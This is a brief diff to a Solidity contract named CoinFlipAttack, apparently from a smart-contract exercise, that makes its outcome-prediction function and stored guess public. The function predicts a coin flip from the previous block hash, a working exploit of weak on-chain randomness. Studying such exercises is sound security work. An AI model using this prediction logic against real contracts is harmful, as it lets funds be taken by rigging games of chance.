@@ -36,7 +36,7 @@ contract CoinFlip {
 
 contract CoinFlipAttack {
     CoinFlip public coinFlip;
-    bool private preCalculatedFlip;
+    bool public preCalculatedFlip;
     uint256 FACTOR =
         57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
@@ -44,7 +44,7 @@ contract CoinFlipAttack {
         coinFlip = CoinFlip(_coinFlipAddress);
     }
 
-    function preCalculateFlip() private view returns (bool) {
+    function preCalculateFlip() public view returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         return ( blockValue / FACTOR ) == 1 ? true : false;
     }
